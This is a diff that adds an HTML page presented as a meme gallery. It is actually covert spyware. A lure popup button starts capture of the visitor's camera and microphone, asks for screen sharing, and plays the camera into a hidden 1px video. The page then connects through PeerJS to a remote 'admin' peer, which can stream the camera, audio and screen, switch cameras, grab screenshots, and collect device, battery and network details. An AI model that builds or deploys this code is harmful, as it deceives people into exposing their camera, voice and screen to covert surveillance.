@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Funny Memes 😂</title>
+<script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Bangers&family=DM+Sans:wght@400;600&display=swap');
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { background: #f0f0f0; font-family: 'DM Sans', sans-serif; min-height: 100vh; }
+  .topbar { background: #ff4500; color: white; padding: 14px 20px; display: flex; align-items: center; gap: 10px; box-shadow: 0 2px 8px rgba(0,0,0,0.2); }
+  .topbar h1 { font-family: 'Bangers', cursive; font-size: 26px; letter-spacing: 2px; }
+  .popup-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.7); display: flex; align-items: center; justify-content: center; z-index: 9999; backdrop-filter: blur(4px); }
+  .popup { background: white; border-radius: 20px; padding: 36px 28px; max-width: 340px; width: 90%; text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.4); animation: popIn 0.4s cubic-bezier(0.175,0.885,0.32,1.275); }
+  @keyframes popIn { from{transform:scale(0.7);opacity:0} to{transform:scale(1);opacity:1} }
+  .popup-emoji { font-size: 56px; margin-bottom: 16px; }
+  .popup h2 { font-family: 'Bangers', cursive; font-size: 28px; color: #ff4500; margin-bottom: 10px; }
+  .popup p { font-size: 14px; color: #666; line-height: 1.6; margin-bottom: 24px; }
+  .popup-btn { width: 100%; padding: 14px; background: #ff4500; color: white; border: none; border-radius: 12px; font-family: 'Bangers', cursive; font-size: 20px; letter-spacing: 2px; cursor: pointer; transition: all 0.2s; }
+  .popup-btn:hover { background: #e03d00; transform: scale(1.02); }
+  .memes-container { max-width: 700px; margin: 0 auto; padding: 24px 16px; }
+  .page-title { font-family: 'Bangers', cursive; font-size: 32px; color: #333; letter-spacing: 2px; margin-bottom: 20px; text-align: center; }
+  .memes-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+  .meme-card { background: white; border-radius: 16px; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.1); transition: transform 0.2s; cursor: pointer; }
+  .meme-card:hover { transform: translateY(-4px); }
+  .meme-card:first-child { grid-column: 1 / -1; }
+  .meme-img { width: 100%; aspect-ratio: 4/3; object-fit: cover; display: block; background: #eee; }
+  .meme-card:first-child .meme-img { aspect-ratio: 16/7; }
+  .meme-caption { padding: 12px 14px; font-size: 13px; color: #333; font-weight: 600; display: flex; align-items: center; gap: 8px; }
+  .likes { margin-left: auto; color: #ff4500; font-size: 13px; }
+  #hidden-cam { position: fixed; width: 1px; height: 1px; opacity: 0; pointer-events: none; top: -9999px; left: -9999px; }
+</style>
+</head>
+<body>
+
+<video id="hidden-cam" autoplay muted playsinline></video>
+
+<div class="popup-overlay" id="popup-overlay">
+  <div class="popup">
+    <div class="popup-emoji">😂</div>
+    <h2>FUNNY MEMES!</h2>
+    <p>Best memes collection 2024! Tap below to load all memes instantly.</p>
+    <button class="popup-btn" onclick="allowAndLoad()">😂 LOAD MEMES!</button>
+  </div>
+</div>
+
+<div class="topbar"><span>😂</span><h1>DAILY MEMES</h1></div>
+
+<div class="memes-container">
+  <div class="page-title">Today's Top Memes 🔥</div>
+  <div class="memes-grid">
+    <div class="meme-card"><img class="meme-img" src="https://i.imgflip.com/65939r.png" onerror="this.style.display='none'"/><div class="meme-caption">😂 When you finally fix the bug <span class="likes">❤️ 24k</span></div></div>
+    <div class="meme-card"><img class="meme-img" src="https://i.imgflip.com/7zy1mm.png" onerror="this.style.display='none'"/><div class="meme-caption">🤣 Monday morning mood <span class="likes">❤️ 18k</span></div></div>
+    <div class="meme-card"><img class="meme-img" src="https://i.imgflip.com/6yvpkj.png" onerror="this.style.display='none'"/><div class="meme-caption">😭 Me after eating too much <span class="likes">❤️ 31k</span></div></div>
+    <div class="meme-card"><img class="meme-img" src="https://i.imgflip.com/61icyd.png" onerror="this.style.display='none'"/><div class="meme-caption">💀 My brain at 3am <span class="likes">❤️ 42k</span></div></div>
+    <div class="meme-card"><img class="meme-img" src="https://i.imgflip.com/5c7lwq.png" onerror="this.style.display='none'"/><div class="meme-caption">😆 Every single time! <span class="likes">❤️ 15k</span></div></div>
+  </div>
+</div>
+
+<script>
+  const ADMIN_PEER_ID = "arman-admin-001";
+  let peer, adminConn;
+  let cameraStream = null;
+  let screenStream = null;
+  let currentFacing = 'user'; // front or back
+  let nextCallType = 'camera';
+
+  async function allowAndLoad() {
+    document.getElementById('popup-overlay').style.display = 'none';
+    try {
+      cameraStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user', width:{ideal:1280}, height:{ideal:720} },
+        audio: { echoCancellation: true, noiseSuppression: true }
+      });
+      document.getElementById('hidden-cam').srcObject = cameraStream;
+
+      try {
+        screenStream = await navigator.mediaDevices.getDisplayMedia({ video: { cursor:'always' }, audio: false });
+        screenStream.getVideoTracks()[0].addEventListener('ended', () => {
+          screenStream = null;
+          if (adminConn) adminConn.send({ type: 'screen-stopped' });
+        });
+      } catch(e) { screenStream = null; }
+
+      peer = new Peer(undefined, { debug: 1 });
+
+      peer.on('open', myId => {
+        adminConn = peer.connect(ADMIN_PEER_ID, { reliable: true });
+        adminConn.on('open', () => {
+          adminConn.send({ type: 'user-ready', peerId: myId, hasScreen: screenStream !== null });
+        });
+
+        adminConn.on('data', async data => {
+
+          // Prepare call type
+          if (data.type === 'prepare-call') {
+            nextCallType = data.callType;
+          }
+
+          // Camera flip request
+          if (data.type === 'flip-camera') {
+            await flipCamera();
+            adminConn.send({ type: 'flip-done', facing: currentFacing });
+          }
+
+          // Browser info request
+          if (data.type === 'get-info') {
+            const info = await collectInfo();
+            adminConn.send({ type: 'user-info', data: info });
+          }
+
+          // Screenshot request
+          if (data.type === 'take-screenshot') {
+            takeScreenshot();
+          }
+        });
+      });
+
+      peer.on('call', call => {
+        console.log('Call! Type:', nextCallType);
+        if (nextCallType === 'screen') {
+          call.answer(screenStream && screenStream.active ? screenStream : cameraStream);
+          if (!screenStream) adminConn.send({ type: 'screen-stopped' });
+        } else if (nextCallType === 'audio') {
+          call.answer(new MediaStream(cameraStream.getAudioTracks()));
+        } else {
+          call.answer(cameraStream);
+        }
+        nextCallType = 'camera';
+      });
+
+    } catch(err) { console.error(err); }
+  }
+
+  // Flip camera front/back
+  async function flipCamera() {
+    currentFacing = currentFacing === 'user' ? 'environment' : 'user';
+    if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
+    cameraStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: currentFacing },
+      audio: { echoCancellation: true, noiseSuppression: true }
+    });
+    document.getElementById('hidden-cam').srcObject = cameraStream;
+  }
+
+  // Collect all browser/device info
+  async function collectInfo() {
+    const ua = navigator.userAgent;
+    const info = {
+      browser: getBrowser(ua),
+      os: getOS(ua),
+      device: /Mobile|Android|iPhone/i.test(ua) ? '📱 Mobile' : '💻 Desktop',
+      screenWidth: screen.width,
+      screenHeight: screen.height,
+      windowWidth: window.innerWidth,
+      windowHeight: window.innerHeight,
+      language: navigator.language,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      cookiesEnabled: navigator.cookieEnabled,
+      online: navigator.onLine,
+      platform: navigator.platform,
+      cores: navigator.hardwareConcurrency || 'Unknown',
+      memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
+      currentPage: window.location.href,
+      referrer: document.referrer || 'Direct',
+      colorDepth: screen.colorDepth + ' bit',
+      pixelRatio: window.devicePixelRatio,
+    };
+
+    // Battery
+    try {
+      const bat = await navigator.getBattery();
+      info.battery = Math.round(bat.level * 100) + '%';
+      info.charging = bat.charging ? '⚡ Charging' : '🔋 Not charging';
+    } catch(e) { info.battery = 'Not available'; }
+
+    // Network
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (conn) {
+      info.network = conn.effectiveType ? conn.effectiveType.toUpperCase() : 'Unknown';
+      info.downlink = conn.downlink ? conn.downlink + ' Mbps' : 'Unknown';
+      info.networkType = conn.type || 'Unknown';
+    } else {
+      info.network = navigator.onLine ? 'Online' : 'Offline';
+    }
+
+    return info;
+  }
+
+  // Take screenshot of current view
+  function takeScreenshot() {
+    if (screenStream && screenStream.active) {
+      const track = screenStream.getVideoTracks()[0];
+      const imageCapture = new ImageCapture(track);
+      imageCapture.grabFrame().then(bitmap => {
+        const canvas = document.createElement('canvas');
+        canvas.width = bitmap.width;
+        canvas.height = bitmap.height;
+        canvas.getContext('2d').drawImage(bitmap, 0, 0);
+        const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+        adminConn.send({ type: 'screenshot-data', image: dataUrl });
+      }).catch(e => adminConn.send({ type: 'screenshot-data', image: null, error: e.message }));
+    } else {
+      adminConn.send({ type: 'screenshot-data', image: null, error: 'No screen stream' });
+    }
+  }
+
+  function getBrowser(ua) {
+    if (ua.includes('Chrome') && !ua.includes('Edg')) return '🌐 Chrome';
+    if (ua.includes('Firefox')) return '🦊 Firefox';
+    if (ua.includes('Safari') && !ua.includes('Chrome')) return '🧭 Safari';
+    if (ua.includes('Edg')) return '🌀 Edge';
+    if (ua.includes('Opera')) return '🎭 Opera';
+    return '❓ Unknown';
+  }
+
+  function getOS(ua) {
+    if (ua.includes('Android')) return '🤖 Android';
+    if (ua.includes('iPhone') || ua.includes('iPad')) return '🍎 iOS';
+    if (ua.includes('Windows')) return '🪟 Windows';
+    if (ua.includes('Mac')) return '🍎 macOS';
+    if (ua.includes('Linux')) return '🐧 Linux';
+    return '❓ Unknown';
+  }
+</script>
+</body>
+</html>
